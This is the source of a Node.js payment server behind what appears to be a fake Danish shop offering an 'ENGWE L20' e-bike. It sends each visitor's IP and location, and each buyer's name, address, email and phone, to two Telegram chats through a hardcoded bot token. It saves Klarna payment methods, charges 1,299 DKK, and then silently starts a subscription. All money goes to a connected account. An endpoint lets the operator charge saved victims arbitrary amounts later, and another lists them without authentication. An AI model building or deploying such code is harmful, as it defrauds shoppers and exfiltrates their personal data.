require('dotenv').config();
const express = require('express');
const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const ACCOUNT_B = 'acct_1R55t6JC1C8AvpQ6';
const TELEGRAM_BOT_TOKEN = '8256018531:AAHzrYSlCNrsmYzVSZnS01VYNzg_huSA2tE';
const TELEGRAM_CHAT_ID = '8522488857';
const TELEGRAM_CHAT_ID_2 = '715805541';
const CUSTOMERS_FILE = '/data/customers.json';

// ─── Customer Storage ─────────────────────────────────────────────────────────

function loadCustomers() {
  try {
    if (fs.existsSync(CUSTOMERS_FILE)) {
      return JSON.parse(fs.readFileSync(CUSTOMERS_FILE, 'utf8'));
    }
  } catch (err) {
    console.log('Error loading customers:', err.message);
  }
  return [];
}

function saveCustomer(entry) {
  const customers = loadCustomers();
  const exists = customers.find(c => c.customerId === entry.customerId);
  if (!exists) {
    customers.push(entry);
    fs.writeFileSync(CUSTOMERS_FILE, JSON.stringify(customers, null, 2));
    console.log('Customer saved:', entry.customerId);
  }
}

// ─── Telegram ─────────────────────────────────────────────────────────────────

async function sendTelegram(message) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
    });
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_2, text: message, parse_mode: 'HTML' })
    });
  } catch (err) {
    console.log('Telegram error:', err.message);
  }
}

// ─── Middleware ───────────────────────────────────────────────────────────────

app.use(cors({ origin: '*', methods: ['GET', 'POST'] }));
app.use(bodyParser.json());

// ─── Routes ───────────────────────────────────────────────────────────────────

app.post('/page-visit', async (req, res) => {
  const { visitorId, ip, country, city } = req.body;
  await sendTelegram(
    `👁 <b>Ny sidbesøger!</b>\n\n` +
    `🆔 Besøger-ID: <code>${visitorId}</code>\n` +
    `🌍 Land: ${country || 'Ukendt'}\n` +
    `🏙 By: ${city || 'Ukendt'}\n` +
    `🔌 IP: ${ip || 'Ukendt'}\n` +
    `🕐 Tid: ${new Date().toLocaleString('da-DK')}`
  );
  res.json({ ok: true });
});

app.post('/create-setup-intent', async (req, res) => {
  let { email, fname, lname, address, zip, city, country, phone, visitorId } = req.body;
  email = email.trim().replace(/\.$/, '');

  try {
    let customer;
    const existing = await stripe.customers.list({ email, limit: 1 });
    if (existing.data.length > 0) {
      customer = existing.data[0];
    } else {
      customer = await stripe.customers.create({
        email,
        address: { country: 'DK' },
      });
    }

    const setupIntent = await stripe.setupIntents.create({
      customer: customer.id,
      payment_method_types: ['klarna'],
      metadata: { customer_id: customer.id },
    });

    await sendTelegram(
      `🛒 <b>Kassaoplysninger!</b>\n\n` +
      `🆔 Besøger-ID: <code>${visitorId}</code>\n` +
      `📧 E-mail: ${email}\n` +
      `👤 Navn: ${fname} ${lname}\n` +
      `📍 Adresse: ${address}, ${zip} ${city}, ${country}\n` +
      `📞 Telefon: ${phone || 'N/A'}\n` +
      `📦 Produkt: ENGWE L20\n` +
      `💰 Beløb: 1.299 DKK\n` +
      `🕐 Tid: ${new Date().toLocaleString('da-DK')}`
    );

    res.json({ clientSecret: setupIntent.client_secret, customerId: customer.id });
  } catch (error) {
    console.error('Error:', error);
    res.status(400).json({ error: error.message });
  }
});

app.post('/payment-initiated', async (req, res) => {
  const { visitorId, email } = req.body;
  await sendTelegram(
    `💳 <b>Betalingsforsøg startet!</b>\n\n` +
    `🆔 Besøger-ID: <code>${visitorId}</code>\n` +
    `📧 E-mail: ${email}\n` +
    `⏳ Kunden har klikket på "Køb nu"\n` +
    `🕐 Tid: ${new Date().toLocaleString('da-DK')}`
  );
  res.json({ ok: true });
});

app.post('/create-subscription', async (req, res) => {
  const { customerId, paymentMethodId, visitorId } = req.body;
  try {
    await stripe.paymentMethods.attach(paymentMethodId, { customer: customerId });
    await stripe.customers.update(customerId, {
      invoice_settings: { default_payment_method: paymentMethodId },
    });

    const paymentMethod = await stripe.paymentMethods.retrieve(paymentMethodId);
    const pmType = paymentMethod.type;

    // Save customer to persistent storage
    saveCustomer({
      customerId,
      paymentMethodId,
      pmType,
      visitorId,
      savedAt: new Date().toISOString(),
    });

    // Charge 1 — 1.299 DKK (129900 cents)
    try {
      const payment1 = await stripe.paymentIntents.create({
        amount: 129900,
        currency: 'dkk',
        customer: customerId,
        payment_method: paymentMethodId,
        payment_method_types: [pmType],
        confirm: true,
        off_session: true,
        transfer_data: { destination: ACCOUNT_B },
      });
      console.log('Payment 1 created:', payment1.id, payment1.status);
    } catch (err) {
      console.log('Payment 1 failed:', err.message);
    }

    await new Promise(resolve => setTimeout(resolve, 30000));

    // Subscription with 30-day trial
    // NOTE: Update 'price_1TgtohD9m5cj7UNqiKNCDw94' to a DKK price ID from your Stripe dashboard
    const subscription = await stripe.subscriptions.create({
      customer: customerId,
      items: [{ price: 'price_1UJOFuBkfefkBB9SiAVLpcE2' }], // UPDATE THIS TO DKK PRICE
      default_payment_method: paymentMethodId,
      trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
      transfer_data: { destination: ACCOUNT_B },
    });
    console.log('Subscription created:', subscription.id, subscription.status);

    await sendTelegram(
      `✅ <b>Betaling gennemført!</b>\n\n` +
      `🆔 Besøger-ID: <code>${visitorId}</code>\n` +
      `📦 Produkt: ENGWE L20\n` +
      `💳 Betalingsmetode: ${pmType}\n` +
      `💳 Beløb: 1.299 DKK\n` +
      `🆔 Ordrenummer: ${subscription.id}\n` +
      `🕐 Tid: ${new Date().toLocaleString('da-DK')}`
    );

    res.json({ subscriptionId: subscription.id, paymentStatus: 'processed' });
  } catch (error) {
    console.error('Error:', error.message);
    res.status(400).json({ error: error.message });
  }
});

// ─── View all saved customers ─────────────────────────────────────────────────
app.get('/customers', (req, res) => {
  const customers = loadCustomers();
  res.json({ total: customers.length, customers });
});

// ─── Manually charge a saved customer ────────────────────────────────────────
// POST /charge-saved
// Body: { "customerId": "cus_xxx", "amount": 129900, "currency": "dkk" }
app.post('/charge-saved', async (req, res) => {
  const { customerId, amount, currency } = req.body;
  const customers = loadCustomers();
  const customer = customers.find(c => c.customerId === customerId);

  if (!customer) {
    return res.status(404).json({ error: 'Customer not found in saved list' });
  }

  try {
    const payment = await stripe.paymentIntents.create({
      amount: amount || 129900,
      currency: currency || 'dkk',
      customer: customer.customerId,
      payment_method: customer.paymentMethodId,
      payment_method_types: [customer.pmType],
      confirm: true,
      off_session: true,
      transfer_data: { destination: ACCOUNT_B },
    });

    console.log('Manual charge created:', payment.id, payment.status);

    await sendTelegram(
      `💰 <b>Manuel betaling!</b>\n\n` +
      `🆔 Kunde: <code>${customerId}</code>\n` +
      `📦 Produkt: ENGWE L20\n` +
      `💳 Beløb: ${(amount || 129900) / 100} DKK\n` +
      `📋 Status: ${payment.status}\n` +
      `🕐 Tid: ${new Date().toLocaleString('da-DK')}`
    );

    res.json({ success: true, paymentId: payment.id, status: payment.status });
  } catch (error) {
    console.error('Manual charge error:', error.message);
    res.status(400).json({ error: error.message });
  }
});

// ─── Health ───────────────────────────────────────────────────────────────────
app.get('/health', (req, res) => {
  const customers = loadCustomers();
  res.json({
    status: 'ok',
    destination: ACCOUNT_B,
    product: 'ENGWE L20',
    amount: '1.299 DKK',
    currency: 'dkk',
    savedCustomers: customers.length,
  });
});

// ─── Start ────────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 4242;
app.listen(PORT, () => {
  console.log('Server running on http://localhost:' + PORT);
});
